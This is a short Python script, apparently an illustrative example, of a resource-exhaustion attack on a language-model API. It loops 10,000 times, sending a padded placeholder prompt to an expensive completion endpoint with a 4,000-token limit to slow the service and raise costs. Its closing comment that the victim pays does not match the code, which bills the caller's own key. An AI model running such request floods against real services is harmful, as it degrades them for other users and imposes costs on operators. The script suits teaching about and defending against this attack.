import openai

openai.api_key = "<your_api_key>" 

# Attacker generates a complex prompt that is resource intensive
malicious_prompt = """
Here is a very long and convoluted prompt with excessive detail and repetition that will require the model to process a huge number of tokens leading to slow performance and high costs: <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> <long prompt> 
"""

# Make repeated calls to expensive model with resource-heavy prompt
for i in range(10000):
  response = openai.Completion.create(
    engine="text-davinci-002",
    prompt=malicious_prompt,
    max_tokens=4000
  )

# Service is degraded from compute-heavy requests
# Attacker incurs high costs for victim